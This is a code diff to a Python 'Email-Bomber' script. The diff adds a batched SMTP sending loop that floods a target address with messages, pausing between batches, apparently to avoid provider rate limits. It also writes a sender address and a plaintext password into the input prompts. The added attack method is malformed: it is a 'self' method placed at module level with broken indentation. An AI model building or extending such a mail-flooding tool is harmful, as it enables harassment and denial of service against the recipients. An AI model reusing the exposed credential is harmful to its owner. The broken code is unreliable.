@@ -5,6 +5,20 @@
 '''imports'''
 import smtplib
 import sys
+import time
+
+ def attack(self):
+     for email in range(20):
+      print(bcolors.GREEN + '\n+[+[+[ Attempting secure account login... ]+]+]+')
+      self.s.login(self.fromAddr, self.fromPwd)
+      print(bcolors.RED + '\n+[+[+[ Attacking parts for 50 batch... ]+]+]+')
+      for email in range(50):
+            self.send()
+            time.sleep(0.5)
+      time.sleep(60)
+
+     self.s.close()
+     print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
 
 
 class bcolors:
@@ -14,7 +28,7 @@ class bcolors:
 
 
 def banner():
-    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.2 ]+]+]+')
     print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
     print(bcolors.GREEN + '''
                      \|/
@@ -28,7 +42,7 @@ def banner():
              |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
             |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
            |#############################|
-           |#############################|              Author: w3w3w3
+           |#############################|              Author: urmom
            |#############################|
             |###########################|
              \#########################/
@@ -45,8 +59,8 @@ class Email_Bomber:
     def __init__(self):
         try:
             print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
-            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
-            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
+            self.target = str(input(bcolors.GREEN + 'Enter target email <: testing.dot@outlook.com'))
+            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: 4'))
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print('ERROR: Invalid Option. GoodBye.')
                 sys.exit(1)
@@ -64,7 +78,7 @@ class Email_Bomber:
             elif self.mode == int(3):
                 self.amount = int(250)
             else:
-                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
+                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: 5'))
             print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
         except Exception as e:
             print(f'ERROR: {e}')
@@ -72,7 +86,7 @@ class Email_Bomber:
     def email(self):
         try:
             print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
-            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
+            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: 3'))
             premade = ['1', '2', '3']
             default_port = True
             if self.server not in premade:
@@ -89,10 +103,10 @@ class Email_Bomber:
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
-            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
-            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
-            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: testing.dot@outlook.com'))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: Spotlock557'))
+            self.subject = str(input(bcolors.GREEN + 'Enter subject <: ://Bomb Activated\\:'))
+            self.message = str(input(bcolors.GREEN + 'Enter message <: Bomb Recieved?'))
 
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAddr, self.target, self.subject, self.message)
